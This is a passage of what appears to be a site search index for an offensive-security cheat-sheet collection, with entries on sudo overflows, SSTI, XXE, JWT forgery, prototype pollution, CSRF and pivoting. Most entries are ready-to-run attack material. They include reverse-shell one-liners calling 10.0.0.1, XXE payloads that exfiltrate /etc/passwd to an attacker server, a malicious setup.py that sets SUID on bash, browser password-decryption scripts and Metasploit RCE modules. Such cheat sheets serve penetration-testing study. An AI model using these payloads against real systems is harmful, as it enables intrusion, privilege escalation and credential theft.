                description: "Buffer overflow in Linux might be vulnerable to privilege escalation (PrivEsc).",
                content: "Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)') malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.\nhttps://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.\nYou can make it the buffer overflow.\ncat /etc/sudoers # ------------------------------------------- ... Defaults pwfeadback ... 2. Input Long String to Password link perl -e 'print((\"A\" x 100 . \"\\x{00}\") x 50)' | sudo -S id # [sudo] password for tryhackme: Segmentation fault 3. Download a Payload and Compile in Local Machine link wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c gcc -o exploit exploit.c 4. Transfer the Payload to Remote Machine link # In local machine python3 -m http.server 8000 # In remote machine wget http://:8000/exploit 5. Execute the Payload in Remote Machine linkAfter that, youll get a root shell.\nchmod 700 ./exploit ./exploit "
            }
        );
    index.add(
            {
                id:  150 ,
                href: "\/docs\/hdks\/web\/security-risk\/prototype-pollution-in-client-side\/",
                title: "Prototype Pollution in Client-Side",
                description: "Prototype Pollution is a JavaScript vulnerability that allows attackers to add arbitrary prooperties to global object prototypes. The vulnerability may exist in Node.js applications.",
                content: "Investigation linkCheck if we can assign arbitrary property via URL.\nTry various ways.\nhttps://example.com/?__proto__[foo]=bar https://example.com/?__proto__.foo=bar https://example.com/?constructor.[prototype][foo]=bar https://example.com/?constructor.prototype.foo=bar # Bypass sanitization https://example.com/?__pro__proto__to__[foo]=bar https://example.com/?__pro__proto__to__.foo=bar https://example.com/?constconstructorructor[prototype][foo]=bar https://example.com/?constconstructorructor.prototype.foo=bar https://example.com/?constconstructorructor[protoprototypetype][foo]=bar https://example.com/?constconstructorructor.protoprototypetype.foo=bar Open browser console, and type the following to check if our above property is assigned.\nObject.prototype.foo constructor.prototype.foo // the expected output: \"bar\" DOM XSS linkIf our payload affects an HTML element after loading, we can inject DOM-based XSS as below.\nAssume the key name of the property is source_url, whose value is loaded as src in a script element. What property name is defined might be found by investigating JavaScript code assigned in the website.\nhttps://example.com/?__proto__[source_url]=data:,alert(1); https://example.com/?__proto__[source_url]=data:,alert(1); https://example.com/?__proto__[source_url]=alert(1)- Finding Gadgets link In browser, open DevTools and click the Sources (Chrome) or the Debugger (FireFox) tab, then find the JavaScript code which is affected by our pollution. When found the line of the code, click the line number at the left of the line to add a breakpoint. Then reload the page. The line that added as a breakpoint is highlighted. We can hover the target property to check the current value assigned. Adjust for executing our payload while checking the propertys value. "
            }
        );
    index.add(
            {
                id:  151 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/rust-privilege-escalation\/",
                title: "Rust Privilege Escalation",
                description: "Rust is a multi-paradigm, general-purpose programming language that emphasizes performance, type safety, and concurrency. If we have a write permission of a Rust file, we may be able to inject arbitrary code to escalate privileges.",
                content: "Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs\nWe can create a binary or module to reverse shell.\ncd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build "
            }
        );
    index.add(
            {
                id:  152 ,
                href: "\/docs\/hdks\/web\/security-risk\/sql-injection\/",
                title: "SQL Injection",
                description: "SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.",
                content: "Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,\nURL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.\n"
            }
        );
    index.add(
            {
                id:  153 ,
                href: "\/docs\/hdks\/web\/extract-web-browser-passwords\/",
                title: "Extract Web Browser Passwords",
                description: "Browsers passwords may be retrieve easily if our device is compromised by decrypting login data.",
                content: "Firefox link wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py python3 firefox_decrypt.py Google Chrome link wget https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py python3 decrypt_chrome_password.py "
            }
        );
    index.add(
            {
                id:  154 ,
                href: "\/docs\/hdks\/web\/bookmarklet-attack\/",
                title: "Bookmarklet Attack",
                description: "If attackers can inject arbitrary JavaScript code in target website, they can induce victims to malicious executions with bookmarklet.",
                content: "Exploitation linkMalicious Links linkAttackers induce victims to add their malicious link into the bookmark menu as below.\nDrag and drop the following link into the bookmark menu to access easily!\nExample.com In addition, if the current website does not set HttpOnly flag on the Set-Cookie response header, attackers can get the victims cookie and send it to the malicious website as below.\nDrag and drop me the following link into the bookmark menu to access easily!\nExample.com "
            }
        );
    index.add(
            {
                id:  155 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/gnuplot-privilege-escalation\/",
                title: "Gnuplot Privilege Escalation",
                description: "gnuplot is a command-line and GUI program that can generate two- and three-dimentional plots of functions, data, and data fits.",
                content: "Command Execution linkThe script file of gnuplot can be used to execute system commands as below.\ngnuplot test.plt Contents of the .plt is like the following.\nsystem \"whoami\" # Reverse shell system \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261'\" "
            }
        );
    index.add(
            {
                id:  156 ,
                href: "\/docs\/hdks\/web\/security-risk\/latex-injection\/",
                title: "LaTeX Injection",
                description: "LaTeX is a software system for document preparation. It may be vulnerable to arbitrary command injection or path traversal.",
                content: "Payloads - Read Files link # Read file \\input{/etc/passwd} $\\input{/etc/passwd}$ $$\\input{/etc/passwd}$$ \\include{example} # Read example.tex $\\include{example}$ $$\\include{example}$$ \\lstinputlisting{/etc/passwd} $\\lstinputlisting{/etc/passwd}$ $$\\lstinputlisting{/etc/passwd}$$ Payloads - Write File link \\newwrite\\outfile $\\newwrite\\outfile$ $$\\newwrite\\outfile$$ \\openout\\outfile=cmd.tex $\\openout\\outfile=cmd.tex$ $$\\openout\\outfile=cmd.tex$$ \\write\\outfile{Hello-World} $\\write\\outfile{Hello-World}$ $$\\write\\outfile{Hello-World}$$ "
            }
        );
    index.add(
            {
                id:  157 ,
                href: "\/docs\/hdks\/web\/api\/graphql-pentesting\/",
                title: "GraphQL Pentesting",
                description: "An open-source data query and manipulation language for APIs, and a runtime for fulfilling queries with existing data.",
                content: "Common Directories link /graphql /graphiql /graphql.php /graphql/console Basic Operations - Queries linkWe can fetch field information by sending queries.\nquery { __typename } Fields linkTo fetch a field object, send a query like the following.\nquery { user { name friends { name } } } Arguments linkWe can get the specific information by padding arguments (e.g. id) to fields.\nquery { user (id: \"1\") { name } } Aliases linkWe can set aliases each field to get multiple results in one request.\nquery { John: user (id: \"1\") { name age } Emma: user (id: \"2\") { name age } } Fragments linkWe can define arbitrary fragment that is be reusable when fetching each field.\nquery { firstUser: user (id: \"1\") { ...userFields } secondUser: user (id: \"2\") { ...userFields } fragment userFields on User { name age friends { name } } } Operation Names linkWe can define an operation name to make an operation less ambiguous. By setting a name, it makes it easier to understand at a glance what kind of operation.\nquery UserNameAndFriends { user { name friends { name } } } Variables link query UsrNameAndFriends($userId: ID) { user (id: $userId) { name friends { name } } } Directives linkWe can filter by passing a directive in fields.\ninclude Only include this field if the argument is true.\nquery UserNameAndFriends($userId: ID, $withFriends: Boolean!) { user(id: $userId) { name friends @include(if: $withFriends) { name } } } skip Skip this field if the argument is true.\nquery UserNameAndFriends($userId: ID, $withFriends: Boolean!) { user(id: $userId) { name friends @skip(if: $withFriends) { name } } } Basic Operations - Mutations linkWe can modify fields with the mutation field.\nmutation { __typename } To modify a field, execute like the following.\nmutation CreateCommentForPost($postId: ID!, $comment: Comment!) { createComment(id: $postId, comment: $comment) { comment } } Enumeration link # List fields query { __schema { types { name } } } query { __schema { types { fields { name } } } } query { __schema { types { fields { name description } } } } query { __schema { types { name fields { name } } } } query { __schema { types { name fields { name args { name description type { name kind ofType { name kind } } } } } } } # Dump database schema fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }} fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } # Dump specific field query { getUsers { username, password } } SQL Injection linkWe might be able to inject SQL somewhere e.g. arguments. Please refer to SQL Injection Cheat Sheet for more payloads.\n{ user (id: \"1' UNION SELECT null,null-- -\") { name password } } NoSQL Injection linkWe might be able to inject NoSQL somewhere e.g. arguments. Please refer to NoSQL Injection for more payloads.\n"
            }
        );
    index.add(
            {
                id:  158 ,
                href: "\/docs\/hdks\/web\/security-risk\/dom-cloberring\/",
                title: "DOM Cloberring",
                description: "Basic Exploitation linkIf the website adds the JavaScript code into the DOM when loading page as below,\nwindow.onload = function() { let someObj = window.someObj || {}; let script = document.createElement('script'); script.src = someObj.url; document.body.appendChild(script); } We may manipulate this someObj and override the properties (url here) using anchor elements, then we can execute arbitrary JavaScript code.\nFor example, insert the following code in the comment, search, etc. in the target website.",
                content: "Basic Exploitation linkIf the website adds the JavaScript code into the DOM when loading page as below,\nwindow.onload = function() { let someObj = window.someObj || {}; let script = document.createElement('script'); script.src = someObj.url; document.body.appendChild(script); } We may manipulate this someObj and override the properties (url here) using anchor elements, then we can execute arbitrary JavaScript code.\nFor example, insert the following code in the comment, search, etc. in the target website.\n"
            }
        );
    index.add(
            {
                id:  159 ,
                href: "\/docs\/hdks\/web\/security-risk\/open-redirect\/",
                title: "Open Redirect",
                description: "It accepts a user-controlled input that specifies a link to an external site and uses that link in a redirect.",
                content: "Payloads link https://vulnerable.com/example.php?redirectUrl=https://attacker.com/ https://vulnerable.com/example.php?redirectUrl=https:\\\\attacker.com\\ https://vulnerable.com/example.php?redirectUrl=https://attacker.com#.vulnerable.com/ https://vulnerable.com/example.php?redirectUrl=https://attacker.com%E3%80%82%23.vulnerable.com/ https://vulnerable.com/example.php?redirectUrl=/%0d/attacker.com/ Unrestricted QR Code Scanning linkReference: https://shahjerry33.medium.com/open-redirection-qr-code-magic-18ace1a0170f\nIf website (or mobile application) has the function for scanning QR code but not restricts URL, we can let it to read malicious QR code.\n1. Generate QR Code linkFirst, we need to create a malicious QR code. There are many online tools for generating it.\n2. Read Malicious QR Code in the Application linkAfter generating the QR code, read the QR code in the target application.\nIf the application does not validate the URL, we can access to the malicious URL.\n"
            }
        );
    index.add(
            {
                id:  160 ,
                href: "\/docs\/hdks\/web\/security-risk\/host-header-attack\/",
                title: "Host Header Attack",
                description: "Abuse Connection State linkIf the web server validates only the first request, we may be able to exploit the second request by keeping the connection and changing the Host header to the internal page.\n1. Send the First Request link GET / HTTP/2 Host: example.com ... Connection: keep-alive 2. Send the Second Request. link POST /admin/change-email HTTP/2 Host: 192.168.0.1 email=admin@example.com\u0026new_email_1=attacker@evil.com\u0026new_email_2=attacker@evil.com As a result, we may be able to change the admins email to arbitrary email.",
                content: "Abuse Connection State linkIf the web server validates only the first request, we may be able to exploit the second request by keeping the connection and changing the Host header to the internal page.\n1. Send the First Request link GET / HTTP/2 Host: example.com ... Connection: keep-alive 2. Send the Second Request. link POST /admin/change-email HTTP/2 Host: 192.168.0.1 email=admin@example.com\u0026new_email_1=attacker@evil.com\u0026new_email_2=attacker@evil.com As a result, we may be able to change the admins email to arbitrary email.\n"
            }
        );
    index.add(
            {
                id:  161 ,
                href: "\/docs\/hdks\/web\/jwt-pentesting\/",
                title: "JWT (Json Web Token) Pentesting",
                description: "JWT is a proposed internet standard for creating data with optional signature and optional encryption whose payload holds JSON that asserts some number of claims.",
                content: "Decode JWT link There are some online JWT decoder/encoder tools like JWT.io. CyberChef can be used for JWT decode. Manipulate JWT linkIf the website uses JWT and we can see the token, copy the JWT and paste it in jwt.io.\nReplace the alg value with none in header. (try the alg header variations such as none, None, nOnE, NONE.) Replace arbitrary values of the payload e.g. username with admin. Empty the signature field. If the error Invalid Signature occured, we can manually create Base64 value for each section (remove the \"=\" symbol).\nIf you want to empty the signature field manually, you can delete the final section.\nFor example,\neyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc4NDYwNjM1fQ. Now copy the JWT.\nGo to the website and replace the original JWT with the new one in HTTP header.\nUpdate Expiration linkIf we dont get the results we expect, try to increase the exp value as below.\n\"exp\": 1679156071 -\u003e 991679156071 Automation linkJWT Toolkit is a toolkit for testing, tweaking and cracking JWT.\nDecode link python jwt_tool.py Scan link # -t: Target URL # -rc: Cookies # -M pb: Playbook Scan Mode # -cv: Canary Value python jwt_tool.py -t https://vulnerable.com/admin -rc \"jwt=;anothercookie=test\" -M pb -cv \"not authorized\" Exploit link # -X i: Exploit (inject inline) # -I -pc username -pv admin: Inject Claim (\"username\": admin) python jwt_tool.py -t https://vulnerable.com/admin -rc \"jwt=;anothercookie=test\" -X i -I -pc username -pv admin Fuzz link # -I -hc kid -hv wordlist.txt: Inject Claim (\"kid\": FUZZ) python jwt_tool.py -t https://vulnerable.com/admin -rc \"jwt=;anothercookie=test\" -I -hc kid -hv wordlist.txt Manual Pentesting link # Tamper (Manual Exploit) python jwt_tool.py -T # Exploit (Automated Exploit) # -X a: Exploit (alg: none) python jwt_tool.py -X a Crack JWT Secret linkFirst of all, you need to put the JWT into the text file.\necho -n '' \u003e jwt.txt # e.g. echo -n 'eyJraWQiOiI1OGNkYTU1ZS03NDY4LTRhNmMtYTQ2MS00NmIzZjM1MTMwMWYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ0ZXN0Iiwic3ViIjoiYWRtaW4iLCJleHAiOjkxNjg2NDY3NjY1fQ.uK-rKQJzEQ7THoZXcfmHhvnwOE5P46IQIVRWmL4juDM' \u003e jwt.txt Then crack the hash using John the Ripper or Hashcat.\njohn --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt hashcat -a 0 -m 16500 jwt.txt passwords.txt hashcat -a 0 -m 16500 jwt.txt passwords.txt -r rules/best64.rule hashcat -a 3 -m 16500 jwt.txt '?u?l?l?l?l?l?l?l' -i --increment-min=6 If you found a secret, you can create a new JWT using the secret on tools like JWT.io.\nAlso we can use jwt-cracker.\nJWK (Json Web Key) Header Injection linkIf the server supports the jwk in the JWT header, we may be able to add arbitrary jwk parameters then impersonate another user.\nTo perform that, JWT Editor extension in Burp Suite is useful.\nInstall JWT Editor in BApp Store in Burp Suite. Go to JWT Editor Keys tab. If the server JWTs algorithm is RSA such as RS256, click New RSA Key then click Generate button in the popup. Send request containing JWT to Burp Repeater. Go to Json Web Token tab, then modify arbitrary parameter e.g. username. Click Attack at the bottom. Select Embedded JWK. In the popup, choose our generated key. After that, the jwk is added in the JWT header. Send request in Repeater. JKU (JWK Set URL) Header Injection linkIf the server supports the jku in the JWT header, we may be able to add arbitrary URL in the jku then impersonate another user. As in the JWK section above, JWT Editor is useful.\nFirst of all, generate RSA key as the JWK section above, then serve it in our own web server. The body is as below.\n{ \"keys\": [ { \"kty\": \"RSA\", \"e\": \"AQAB\", \"kid\": \"9c8bc417-ccbf-4b9d-b22b-b90c82f958c6\", \"n\": \"g7Qf9pqbHfqOXU3kGs4AnvZZvLsxV4kaxs3gLjgD_J4WMOZI7zmRlxuDg74r6gCKeEDdk4JilkRLnZ85xAG4vRMbuODKD-I1uNv6_ZT6RcCh8YS6tQn-bHPOdfcxgoTGpLBLHpj9dLIPwEFhNQiikJkaQxA_RF1eQAQhFO_6AHRBDNkDJfHUhu9ymbsFSpskMIhi3pMISKKSZSF2vYt3gR3Kq4tjUAnfLW_8XUdeJ56RKjBeVV2IgVfmOn-UvHcnLKm2Kki60G1ViEFcQiRzqp9DY8g91RZSMY3xHO0L2LZg34MZ3NInE7XyaRgupotn7yFImYkvd86L0VwICa6b8w\" } ] } After that, add jku in the JWT header and set the URL of our server. Then set the kid of our generated key into the kid.\nFinally modify arbitrary value e.g. username.\nAs a result, our JWT is as the following.\n// Header { \"kid\": \"9c8bc417-ccbf-4b9d-b22b-b90c82f958c6\", \"alg\": \"RS256\", \"jku\": \"https://attacker.com/key\" } // Payload { \"user\": \"administrator\" \"exp\": 123456789 } Now send request using the JWT above. We may be able to become administrator.\n"
            }
        );
    index.add(
            {
                id:  162 ,
                href: "\/docs\/hdks\/web\/security-risk\/blind-xxe\/",
                title: "Blind XXE",
                description: "XXE is a type of vulnerability that allows an attacker to inject and execute malicious XML code on a server that parses XML input, without directly receiving any feedback or response from the server.",
                content: "Data Exfiltration via Out-Of-Band link1. Create a Malicious DTD linkWe need to prepare the dtd file (named exploit.dtd here) to retrieve the target file.\nReplace the ip address with your own.\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfiltrate SYSTEM 'http://10.0.0.1/?x=%file;'\u003e\"\u003e %eval; %exfiltrate; Then host it on web server.\nsudo python3 -m http.server 80 2. Insert XXE linkIn http request body, insert the following XXE payload.\nSame as above DTD, replace the ip address with your own\n\u003c!DOCTYPE foo [\u003c!ENTITY % xxe SYSTEM \"http://10.0.0.1/exploit.dtd\"\u003e %xxe;]\u003e Now send request. We might retrieve the local file of the target system via web server.\nData Exfiltration via Out-Of-Band (Error-based) linkIf the website shows error messages when performing XXE, we can use the following malicious DTD.\n\u003c!ENTITY % file SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % eval \"\u003c!ENTITY \u0026#x25; exfil SYSTEM 'file:///invalid/%file;'\u003e\"\u003e %eval; %exfil; For the rest, please refer to the section above.\nInside XLSX File linkAn XLSX file is a Microsoft Excel spreadsheet.\n1. Create a XLSX File linkFirst we need to create a XLSX file using some software such as LibreOffice Calc.\n2. Extract the XLSX File link 7z -oXXE xxe.xlsx cd XXE We should get files such as .xml.\n3. Add Blind XXE Payload in the XML File. linkInsert the following payload into the xl/workbook.xml.\nReplace the 10.0.0.1 with your local ip address.\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e \u003c!DOCTYPE cdl [\u003c!ELEMENT cdl ANY \u003e\u003c!ENTITY % asd SYSTEM \"http://10.0.0.1/xxe.dtd\"\u003e%asd;%c;]\u003e \u0026rrr; 4. Rebuild the XLSX File. link cd XXE 7z u ../xxe.xlsx * 5. Create XXE inside a DTD File linkCreate xxe.dtd.\nReplace 10.0.0.1 with your local ip address.\n\u003c!ENTITY % d SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % c \"\u003c!ENTITY rrr SYSTEM 'ftp://10.0.0.1:2121/%d;'\u003e\"\u003e 6. Start a local server linkServe the DTD file using xxeserv.\ngit clone https://github.com/staaldraad/xxeserv.git cd xxeserv go mod init xxeftp.go go build go run xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000 In another terminal, start a web server in the directory where xxe.dtd located.\nsudo python3 -m http.server 80 Now upload xxe.xlsx file in the website. We should get the content of the desired file.\n"
            }
        );
    index.add(
            {
                id:  163 ,
                href: "\/docs\/hdks\/web\/security-risk\/csrf\/",
                title: "CSRF (Cross-Site Request Forgery)",
                description: "CSRF is an attacking methodology that forces an end user to execute unexpected actions on a web application. CSRF is an attack against a user's web browser.",
                content: "Account Takeover linkIf the victim user access to the page where the payload put in, the victim account information will be changed to the attackers information e.g. Email address or Username.\nCSRF Token Bypass linkBelow is to bypass CSRF token by using another CSRF token that we get.\nCookie Injection link Referrer Validation linkReferrer validation may be enabled depending on the website.\nIf so, we can try to bypass the validation by manipulating the browsers session history stack.\nReveal Another User Information linkWe can retrieve the information of the another user account which accesses to the web page where the payload inserted.\nMost of the time, this attack can be executed if the web page allows us to XSS.\nForce Requesting to Our Server linkStart web server in local machine for looking at the access log information.\nsudo python3 -m http.server 80 Now send POST request with the victims information in the target website.\nFor example, assume the target web page contains the current logged-in user information in the element of the id named userinfo.\nAfter a while, we can retrieve access logs contain the information of victims in local machine.\nBypass SameSite Restriction linkReference: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions\nIf the SameSite restriction is set as below, we need to bypass it to perform CSRF.\nSet-Cookie: session=abcdef; SameSite=Strict If its not set, SameSite=Lax is set by default.\nLax linkThe Lax is set in the SameSite by default if the website does not specify the SameSite value in the Cookie. It restricts the GET method only so we cannot use POST method in the payload. However, we can overwrite this method in the GET parameter by as below.\nhttps://example.com/change-email?email=evil@evil.com\u0026_method=POST So our CSRF payload as the following:\nEncode the URL value if necessary. (URL encoding)\nStrict linkIf the Strict is set as the SameSite value, we cannot send any cross-site requests. However, we may be able to perform CSRF by using redirects. For example, when we send a comment in a blog page, we see the message such as Thank you for your message in the result page then redirect to the post page.\nEncode the URL value if necessary. (URL encoding)\n"
            }
        );
    index.add(
            {
                id:  164 ,
                href: "\/docs\/hdks\/web\/framework\/python\/tornado-pentesting\/",
                title: "Tornado Pentesting",
                description: "Tornado is a Python web server and web application framework.",
                content: "Server-Side Template Injection (SSTI) linkWe can execute arbitrary Python script using the server-site template injection.\nFirst check if the script will be executed as below.\nWebsite by {{ 2*3 }} {{ 2*3 }} # URL parameters https://example.com/?q={{2*3}} If the website shows 6 instead of 2*3, we can execute arbitrary code.\nTry following payloads.\n{% import os %}{{ os.popen(\"whoami\").read() }} # Reverse shell. Replace \"10.0.0.1\" with your own ip # It requires a listener like `nc -lvnp 4444` in local terminal. {% import socket,subprocess,os %}{{ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]) }} "
            }
        );
    index.add(
            {
                id:  165 ,
                href: "\/docs\/hdks\/windows\/wsl\/wsl-pentesting\/",
                title: "WSL Pentesting",
                description: "WSL (Windows Subsystem for Linux) is a feature of Windows that allows developers to run a Linux environment without the need for a separate virtual machine or dual booting.",
                content: "Interesting Files link cat /etc/wsl.conf Escape WSL to Windows Host Machine linkIf weare currently on WSL machine, we can access to the host Windows machine as below.\ncd /mnt/c/ If /mnt/c/ is empty, we need to mount the folder by running the following command.\ncd / # -t: Limit the set of filesystem types # drvfs: A plugin for WSL # C: : Specify the Windows root mount -t drvfs C: /mnt/c "
            }
        );
    index.add(
            {
                id:  166 ,
                href: "\/docs\/hdks\/web\/cacti-pentesting\/",
                title: "Cacti Pentesting",
                description: "Cacti is a web-based network monitoring, performance, fault and configuration management framework designed as a front-end application.",
                content: "Default Credentials link admin:admin Common Directories link /include/config.php Remote Code Execution (RCE) CVE-2022-46169 linkReference: https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/\nmsfconsole msf\u003e use exploit/linux/http/cacti_unauthenticated_cmd_injection msf\u003e (set options...) msf\u003e run Also we can refer to Exploit DB.\n"
            }
        );
    index.add(
            {
                id:  167 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/pip-download-code-execution\/",
                title: "Pip Download Code Execution",
                description: "Pip is a package management system written in Python. It can download custom Python package so we can create a malicious package to execute arbitrary code.",
                content: "Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi\nAssume the package named exploitpy.\nWe need to create setup.py in the project root, and \"init.py\", main.py in src directory.\nmkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo 'print(\"hello\")' \u003e src/main.py Below is the content of the setup.py.\nThe arbitrary code is injected in the RunCommand method. It is executed when pip download command.\n# setup.py from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info def RunCommand(): # Arbitrary code here! import os;os.system(\"chmod u+s /usr/bin/bash\") class RunEggInfoCommand(egg_info): def run(self): RunCommand() egg_info.run(self) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name = \"exploitpy\", version = \"0.0.1\", license = \"MIT\", packages=find_packages(), cmdclass={ 'install' : RunInstallCommand, 'egg_info': RunEggInfoCommand }, ) To package the project, run the following command in the project root.\n# If you don't have modules below, install them first. pip3 install setuptools pip3 install build # Build python3 -m build It generates .tar.gz file in dist folder.\n2. Download the Package linkWe need to host the package using pypi-server.\n# Install the module if you don't have it pip3 install pypiserver # Copy the tar.gz file into the \"package\" folder. mkdir package cp ./exploitpy/dist/exploitpy-0.0.1.tar.gz ./package pypi-server run -v -p 8000 ./package Then download the package by the following command.\nIf the pip command can be executed as root, we can also escalate privileges.\nWhen downloading, arbitrary code, that we specified in setup.py, will be executed.\npip3 download exploitpy --index-url https://localhost:8000 -v "
            }
        );
    index.add(
            {
                id:  168 ,
                href: "\/docs\/hdks\/web\/microsoft\/microsoft-exchange-server-pentesting\/",
                title: "Microsoft Exchange Server Pentesting",
                description: "Microsoft Exchange Server is a mail server and calendaring server developed by Microsoft.",
                content: "Enumeration linkOWA (Outlook Web Access) link msfconsole # Client Access Server (CAS) IIS HTTP Internal IP Disclosure msf\u003e use auxiliary/scanner/http/owa_iis_internal_ip # Brute Force credentials msf\u003e use auxiliary/scanner/http/owa_login Common Directories link # Autodiscover service /autodiscover/ /autodiscover/autodiscover.xml # Enhanced Client or Proxy /ecp/ # Exchange Web Services /ews/ # Offline Address Books /oab/ # Outlook Web Access /owa/ /owa/auth/login.aspx ProxyShell RCE linkCVE-2021-31207, CVE-2021-34523, CVE-2021-34473 Reference: https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/\nmsfconsole msf\u003e use exploit/windows/http/exchange_proxyshell_rce msf\u003e (set options...) msf\u003e exploit meterpreter\u003e shell "
            }
        );
    index.add(
            {
                id:  169 ,
                href: "\/docs\/hdks\/web\/cookie\/cookie-hijacking\/",
                title: "Cookie Hijacking",
                description: "A methodology of manipulating, grabbing cookies.",
                content: "Cookie Manipulation link Cookie: PHPSESSID=0 Cookie: PHPSESSID=1 Cookie: PHPSESSID=999 Cookie: PHPSESSID=3836382d61646d696e PHP Cookie Grabbing with XSS linkIn your local machine, create the payload for grabbing the cookie when the other user will access your machine.\n// steal_cookie.php \u003c?php echo $_GET['cookie']; ?\u003e Create the JavaScript code to force users to access your machine which shows the victims cookie value.\nPOST request with this JavaScript code to the target web page.\nOpen listner in your local machine and wait for the other users will access the target web page.\nnc -lvnp 4444 Python Cookie Stealer with XSS linkThis script is useful to steal Cookie.\nTo start web server, execute the Python script as below.\npython2 XSS-cookie-stealer.py Then inject our XSS to steal Cookie via our web server.\nFor instance,\n"
            }
        );
    index.add(
            {
                id:  170 ,
                href: "\/docs\/hdks\/linux\/post-exploitation\/linux-pivoting\/",
                title: "Linux Pivoting",
                description: "Accessing obtained over one machine to exploit another machine deeper in the network.",
                content: "Enumerate Network in Remote Machine linkAfter entering remote machine, we can enumerate and search other networks.\nBefore that if the target machine does not have nmap, we can upload the binary to target machine.\n# Linux 64-bit wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap When were ready, lets investigate the network as follow.\n# ARP cache arp -a # Network hosts, ip addresses cat /etc/hosts cat /etc/resolv.conf nmcli dev show # Network ranges nmap 10.0.0.1-255 nmap 172.17.0.1-255 for i in {1..255}; do (ping -c 1 10.0.0.${i} | grep \"bytes from\" \u0026); done # Port scan nmap 10.0.0.2 nmap 172.17.0.2 for i in {1..65535}; do (echo \u003e /dev/tcp/172.17.0.2/$i) \u003e/dev/null 2\u003e\u00261 \u0026\u0026 echo $i is open; done Access to Not Directly Accessible Host linkIf we find host and port but cannot directly access from local machine, we can accomplish that by reverse port forwarding.\nFor example, assume we found another host 172.16.22.2 and port 5985 in remote machine, then we want to connect the port on the host. Execute the following commands on each machine.\n# In local machine chisel server -p 9999 --reverse # In remote machine # replace \"10.0.0.1\" with your local ip address chisel client 10.0.0.1:9999 R:5985:172.16.22.2:5985 Now we can access to 172.16.22.2:5985 from local machine as follow.\nnmap -p 5985 localhost # Result PORT STATE SERVICE 5985/tcp open wsman After that we can connect to the service.\nevil-winrm -u username -p password -i localhost For details, please refer to Port Forwarding with Chisel.\nBasic Flow with Metasploit, Meterpreter link msfconsole msf\u003e use auxiliary/... msf\u003e run msf\u003e background # Upgrade the latest session to meterpreter msf\u003e sessions -u -1 # Interact with the latest session (meterpreter) msf\u003e sessions -i -1 # Resolve the remote hostname to an ip address meterpreter\u003e resolve # Background the meterpreter session meterpreter\u003e background # Configure the routing table to the destination for 172.28.101.51 (outputted ip of the \"resolve\" command) to the latest opened session. msf\u003e route add 172.28.101.51/32 -1 # Configure the routing table to the other destination for 172.17.0.1 (e.g. written in /.dockerenv) to the latest opened session. msf\u003e route add 172.17.0.1/32 -1 # Print the routing table msf\u003e route print After modifying the routing table, you can fetch information using the IP (e.g. 172.28.101.51) in msfconsole. For example:\n# PostgreSQL msf\u003e use auxiliary/scanner/postgres/postgres_schemadump msf\u003e run postgres://postgres:postgres@172.28.101.51/postgres msf\u003e use auxiliary/admin/postgres/postgres_sql msf\u003e run postgres://postgres:postgres@172.28.101/postgres sql='select * from ' Socks Proxy\nIt is an intermediate server that supports relaying networking traffic between two machines.\nmsfconsole msf\u003e use auxiliary/server/socks_proxy msf\u003e run srvhost=127.0.0.1 srvport=9050 version=4a # Check if the socks proxy is running as a background job. msf\u003e jobs # Stop the socks proxy msf\u003e jobs -k After that, you can use the localhost using tools like curl, proxychains.\ncurl --proxy socks4a://localhost:9050 